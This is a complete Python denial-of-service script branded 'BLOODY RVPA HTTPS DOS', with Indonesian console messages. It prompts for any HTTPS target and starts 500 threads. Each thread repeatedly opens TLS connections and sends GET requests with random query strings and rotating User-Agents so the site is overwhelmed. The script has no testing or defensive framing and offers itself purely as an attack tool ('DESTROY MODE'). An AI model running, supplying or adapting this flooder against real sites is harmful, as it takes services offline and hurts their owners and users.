import socket
import threading
import time
import random
import ssl

# ==================== BLOODY RVPA HTTPS DOS ====================
print("\033[91m")
print(r"""
   ██████╗ ██╗   ██╗██████╗  █████╗ 
   ██╔══██╗██║   ██║██╔══██╗██╔══██╗
   ██████╔╝██║   ██║██████╔╝███████║
   ██╔══██╗██║   ██║██╔══██╗██╔══██║
   ██║  ██║╚██████╔╝██║  ██║██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
         BLOODY RVPA HTTPS DOS
               DESTROY MODE
""")
print("\033[0m")

target = input("\033[93mMasukkan Target HTTPS (https://example.com) : \033[0m").strip()

if not target.startswith("http"):
    target = "https://" + target

host = target.replace("https://", "").replace("http://", "").split("/")[0]
threads = 500
port = 443  # HTTPS

# Load User Agent
try:
    with open("user.db", "r") as f:
        user_agents = [line.strip() for line in f if line.strip()]
    print(f"\033[92m[+] Loaded {len(user_agents)} User Agents dari user.db\033[0m")
except:
    print("\033[91m[-] File user.db tidak ditemukan! Buat dulu bro\033[0m")
    exit()

def https_dos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # Wrap dengan SSL untuk HTTPS
            context = ssl.create_default_context()
            ssock = context.wrap_socket(s, server_hostname=host)
            
            ua = random.choice(user_agents)
            rand = random.randint(100000000, 999999999)
            
            payload = f"GET /?rvpa={rand} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
            ssock.sendall(payload.encode())
            ssock.close()
        except:
            pass

print(f"\033[91m[+] RVPA HTTPS DOS START → {target} | {threads} THREADS\033[0m")

for i in range(threads):
    t = threading.Thread(target=https_dos)
    t.daemon = True
    t.start()
    if i % 80 == 0:
        time.sleep(0.015)

print("\033[91m[+] SERANGAN HTTPS DoS BERJALAN GILA! CTRL+C BUAT STOP\033[0m")

try:
    while True:
        print(f"[{time.strftime('%H:%M:%S')}] RVPA HTTPS DOS ACTIVE | {threads} THREADS | TARGET: {host}")
        time.sleep(4)
except KeyboardInterrupt:
    print("\n\033[91m[+] ATTACK STOPPED BY TUAN RVPA\033[0m")
